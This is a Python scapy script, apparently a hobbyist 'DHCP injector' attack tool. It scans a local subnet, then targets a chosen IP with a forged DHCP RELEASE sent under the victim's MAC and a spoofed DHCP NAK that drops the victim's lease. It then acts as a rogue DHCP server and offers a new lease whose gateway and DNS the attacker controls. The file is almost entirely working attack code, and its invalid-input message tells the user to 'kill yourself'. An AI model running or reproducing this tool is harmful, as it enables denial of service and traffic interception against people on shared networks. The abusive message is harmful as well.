from scapy.all import *
from datetime import datetime
import sys
import socket

# Dictionary to store DHCP bindings
dhcp_bindings = {}
DHCP_SERVER_IP_ADDRESS = "192.168.0.1"
MY_MAC = "DC:97:BA:17:82:BA"

ip_pool = ["192.168.0." + str(i) for i in range(2, 253)]
gateway_ip = "192.168.1.1"
dns_server_ip = "192.168.1.1"
Intface = "eth0"

leases = {}
    
def get_local_ip():
    try:
        # Connect to an external IP (Google DNS) without sending data
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        return f"Error: {e}"

def GetDHCPMac():
    first_key = next(iter(dhcp_bindings))
    
    return first_key

def get_mac_from_ip(ip, bindings):
    for mac, bound_ip in bindings.items():
        if bound_ip == ip:
            return mac
    return None  # not found

def directAttack(ip_address):
    '''Send a Release to the DHCP Server, then send a NACK to the victim device.'''
    print(f"Directly attacking {ip_address}...")
    forge_false_release(ip_address, 1)  # Send DHCP Release
    forge_false_NACK(ip_address, 1)  # Send DHCP NACK to invalidate IP address
    forge_false_offer(ip_address, 5)  # Send DHCP Offer with a different IP address
    '''now with the rogue DHCP server, Send a DHCP offer to the victim device with a different IP address.'''


def print_help():   
    print("DHCP injector:")
    print("S - Map TCP connections of other devices")
    print("A <IP> - Directly attack a specific IP address")
    print("Q - Quit the program")
    print("\nNote: This tool is designed to work with devices in the same VLAN and requires appropriate permissions to send TCP ACK requests.")

def print_bindings():
    """
    Print the current DHCP bindings in a neat table.
    """
    if not dhcp_bindings:
        print("No DHCP bindings found.\n")
        return

    print("\n{:<4} {:<20} {:<15}".format("No.", "MAC Address", "IP Address"))
    print("-" * 43)
    for idx, (mac, ip) in enumerate(dhcp_bindings.items(), 1):
        print("{:<4} {:<20} {:<15}".format(idx, mac, ip))
    print("-" * 43 + "\n")

def tcp_arp_scan_dynamic():
    """
    Perform a TCP ARP scan on the /24 subnet of the current local IP.
    """
    local_ip = get_local_ip()
    print(f"Scanning for devices on local network: {local_ip} with subnet /24")
    base_ip_parts = local_ip.split(".")[:3]  # e.g., ['192', '168', '0']

    for i in range(1, 7):
        #Step 1: ARP to get MAC address
        target_ip = f"{base_ip_parts[0]}.{base_ip_parts[1]}.{base_ip_parts[2]}.{i}"
        interface = Intface

        arp_request = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp_request

        ans, _ = srp(packet, timeout=2, iface=interface, verbose=False)

        if ans:
            target_mac = ans[0][1].hwsrc
            print(f"[+] MAC Address of {target_ip} is {target_mac}")
            dhcp_bindings[target_mac] = target_ip  # Store IP and MAC
        else:
            print(f"[-] No ARP reply received. Host may be offline.")
            continue

        # Step 2: TCP SYN to check for online presence
        ip = IP(dst=target_ip)
        tcp = TCP(dport=80, flags="S")  # SYN to port 80

        response = sr1(ip/tcp, timeout=2, iface=interface, verbose=False)

        if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
            print(f"[+] Host {target_ip} is online. Port 80 is open.")
            # Send RST to close the half-open connection
            rst = TCP(dport=80, sport=response.sport, flags="R", seq=response.ack, ack=response.seq + 1)
            send_rst = ip / rst
            sr1(send_rst, timeout=1, verbose=False)
        else:
            print(f"[-] No SYN-ACK. Host may be down or port is closed.")

def tcp_syn_scan_dynamic():
    """
    Perform a TCP SYN scan on the /24 subnet of the current local IP.
    """
    local_ip = get_local_ip()
    print(f"Scanning for devices on local network: {local_ip} with subnet /24")
    base_ip_parts = local_ip.split(".")[:3]  # e.g., ['192', '168', '0']

    target_port = 456  # Common web port

    for i in range(1, 6):
        ip = f"{base_ip_parts[0]}.{base_ip_parts[1]}.{base_ip_parts[2]}.{i}"
        print(f"Scanning IP: {ip}")

        # Craft SYN packetd
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC address
        ip_packet = IP(dst=ip)
        tcp_packet = TCP(flags="S")

        # Send and receive response
        response = sr1(ip_packet / tcp_packet, timeout=2, verbose=1)

        if response is None:
            print(f"No response from {ip}")
            continue
        print(f"summary below")
        print(response)
        if response.haslayer(Ether):
            tcp_flags = response.getlayer(TCP).flags
            if tcp_flags == 0x12:  # SYN-ACK
                print(f"[+] Host {ip} has port {target_port} open (SYN/ACK received)")
                mac =response.src  # Store IP and MAC
                dhcp_bindings[ip] = mac
            elif tcp_flags == 0x14:  # RST-ACK
                print(f"[-] Host {ip} is up, but port {target_port} is closed (RST received)")
                #dhcp_bindings[ip] = "RST"
        else:
            print(response)
            print(f"[?] Unexpected response from {ip}")

def forge_false_release(ip_address, number_of_times=1):   
    """
    Forge a DHCP Release packet to drop an IP address.
    """
    mac_address = get_mac_from_ip(ip_address, dhcp_bindings) 
    print(f"MAC address for {ip_address} is {mac_address}")
    for _ in range(int(number_of_times)):
        print("starting DHCP release")
        #p = chaddr=bytes.fromhex("60:b9:c0:3b:96:21".replace(":",""))
        print("MAC ADDRESS", mac_address)
        
        # Convert MAC to raw 16-byte chaddr field (6 bytes for MAC, padded to 16)
        mac_bytes = bytes.fromhex(mac_address.replace(":", "")) + b'\x00' * 10

        # Craft DHCPRELEASE packet
        packet = (
            Ether(src=mac_address, dst="60:b9:c0:3b:96:21") /
            IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) /
            UDP(sport=68, dport=67) /
            BOOTP(op=1, chaddr=mac_bytes, ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
            DHCP(options=[
                ("message-type", "release"),
                ("server_id", DHCP_SERVER_IP_ADDRESS),
                ("client_id", b'\x01'+  bytes.fromhex(mac_address.replace(":", ""))),
                ("end")
            ]) / 
            Raw(load=b'\x00' * 43)
        )

        # Send the packet (update iface to match your interface)
        sendp(packet, iface=Intface, verbose=0)
        
        # send(Ether(src=mac_address, dst="60:b9:c0:3b:96:21") /
        #     IP(src=ip_address,dst=DHCP_SERVER_IP_ADDRESS) / 
        #     UDP(sport=68,dport=67) /
        #     BOOTP(chaddr=bytes.fromhex(mac_address.replace(":","")), ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
        #     DHCP(options=[("message-type","release"), ("server_id",DHCP_SERVER_IP_ADDRESS), 'end']))
        
        # # packet = Ether(src=mac_address, dst=p) / \
        # #         IP(src=ip_address, dst=DHCP_SERVER_IP_ADDRESS) / \
        # #         UDP(sport=68, dport=67) / \
        # #             BOOTP(op=1, chaddr=bytes.fromhex(mac_address.replace(":","")), ciaddr=ip_address, xid=RandInt()) / \
        # #             DHCP(options=[("message-type", "release"), ("server_id", DHCP_SERVER_IP_ADDRESS), "end"])
        # # send(packet, verbose=False)
        # print(f"Sent DHCP Release for {ip_address} from {mac_address}")
        print("Die")

def forge_false_NACK(ip_address, number_of_times=1):
    """
    Forge a DHCP NACK packet to force client to invalidate its IP address.
    """
    print("starting DHCP NACK")
    mac_address = get_mac_from_ip(ip_address, dhcp_bindings) 
    if not mac_address:
        print(f"[!] No MAC mapping found for {ip_address}")
        return
    print("MAC ADDRESS", mac_address)
    
    mac_bytes = bytes.fromhex(mac_address.replace(":", "")) + b'\x00' * 10
    if not mac_address:
        print(f"MAC address for {ip_address} not found in bindings.")
        return
    mac_bytes = bytes.fromhex(mac_address.replace(":", "")) + b'\x00' * 10
    for i in range(number_of_times):
        
        packet = (
            Ether(src=GetDHCPMac(), dst=mac_address) /
            IP(src=DHCP_SERVER_IP_ADDRESS, dst=ip_address) /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, siaddr=DHCP_SERVER_IP_ADDRESS,  chaddr=mac_bytes, ciaddr=ip_address, xid=random.randint(0, 0xFFFFFFFF)) /
           DHCP(options=[
            ("message-type", "nak"),
            ("server_id", DHCP_SERVER_IP_ADDRESS),
            "end"
            ]) / 
            Raw(load=b'\x00' * 43)
        )
        
            # Create BOOTP and DHCP layers separately
            # bootp = BOOTP(
            #     op=2,
            #     yiaddr="0.0.0.0",
            #     chaddr=mac2str(mac_address),
            #     ciaddr=ip_address,
            #     xid=RandInt()
            # )

            # dhcp = DHCP(options=[
            #     ("message-type", "nak"),
            #     ("server_id", DHCP_SERVER_IP_ADDRESS),
            #     "end"
            # ])

            # # Construct full packet
            # packet = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
            #         IP(src=DHCP_SERVER_IP_ADDRESS, dst="255.255.255.255") / \
            #         UDP(sport=67, dport=68) / \
            #         bootp / dhcp

            # Send packet
        sendp(packet, verbose=0)
        print(f"[+] Sent DHCP NACK for {ip_address} from {mac_address} to invalidate its IP address.")

def get_free_ip(mac):
        ip = ip_pool.pop(0)
        leases[mac] = ip
        return ip

def send_dhcp_ack(mac, mac_bytes, xid, ip_address):
    ack_pkt = (
        Ether(src=MY_MAC, dst=mac) /
        IP(src=gateway_ip, dst="255.255.255.255") /
        UDP(sport=67, dport=68) /
        BOOTP(op=2, yiaddr=ip_address, siaddr=gateway_ip, chaddr=mac_bytes, xid=xid) /
        DHCP(options=[
            ("message-type", "ack"),
            ("server_id", gateway_ip),
            ("router", gateway_ip),
            ("name_server", dns_server_ip),
            ("lease_time", 3600),
            "end"
        ])
    )
    sendp(ack_pkt, verbose=False)
    print(f"[+] Sent DHCPACK to {mac} confirming {ip_address}")

def wait_for_dhcp_request(xid, mac, timeout=5):
    """Sniff for DHCPREQUEST from the target MAC and XID"""
    def match(pkt):
        return (DHCP in pkt and
                pkt[Ether].src == mac and
                pkt[BOOTP].xid == xid and
                pkt[DHCP].options[0][1] == 3)  # DHCPREQUEST

    print(f"[*] Waiting for DHCPREQUEST from {mac} (xid={xid})...")
    pkt = sniff(filter="udp and (port 67 or 68)", timeout=timeout, count=1, lfilter=match)
    return pkt[0] if pkt else None

def forge_false_offer(ip_address, number_of_times=5):
    mac = get_mac_from_ip(ip_address, dhcp_bindings)
    if not mac:
        print(f"[!] No MAC mapping found for {ip_address}")
        return

    mac_bytes = bytes.fromhex(mac.replace(":", "")) + b'\x00' * 10
    success = False

    for attempt in range(number_of_times):
        xid = random.randint(0, 0xFFFFFFFF)
        offered_ip = get_free_ip(mac)

        offer_pkt = (
            Ether(src=MY_MAC, dst=mac) /
            IP(src=gateway_ip, dst="255.255.255.255") /
            UDP(sport=67, dport=68) /
            BOOTP(op=2, yiaddr=offered_ip, siaddr=gateway_ip, chaddr=mac_bytes, xid=xid) /
            DHCP(options=[
                ("message-type", "offer"),
                ("server_id", gateway_ip),
                ("router", gateway_ip),
                ("name_server", dns_server_ip),
                ("lease_time", 3600),
                "end"
            ])
        )
        sendp(offer_pkt, verbose=False)
        print(f"[+] Sent DHCPOFFER to {mac} offering {offered_ip} (attempt {attempt + 1})")

        req = wait_for_dhcp_request(xid, mac)
        if req:
            send_dhcp_ack(mac, mac_bytes, xid, offered_ip)
            success = True
            break
        else:
            print(f"[!] No DHCPREQUEST received (attempt {attempt + 1})")

    if not success:
        print(f"[!] Failed to complete DHCP handshake with {mac} after {number_of_times} tries")

def main():
    print("Press H for help or Q to quit.\n")
    while True:
        choice = input(">> ").strip().upper()
        if choice == "S":
            print("Mapping TCP connections of other devices...")
            tcp_arp_scan_dynamic()  
            print("ARP scan completed. Current DHCP bindings:")
            print_bindings()
            # Here you would implement the logic to map TCP connections by sending TCP ACK requests to other user devices found in the VLAN. From the TCP ACK they give back, find their MAC address and associated IP and map it in the dhcp_bindings dictionary.
            
        elif choice == "H":
            print_help()
        elif choice == "Q":
            print("Exiting DHCP Monitor. Goodbye!")
            sys.exit(0)
        elif choice == "P":
            print_bindings()
        elif choice.startswith("A "):
            parts = choice.split()
            if len(parts) >= 2:
                ip = parts[1][:]  # Remove the dash
                directAttack(ip)
        elif choice == "T":
            print("Sending testing NACK to my own address")
            forge_false_NACK("192.168.0.116", 1)  
            forge_false_offer("192.168.0.116", 5)
        else:
            print("Invalid choice. Kill yourself \n")

if __name__ == "__main__":
    main()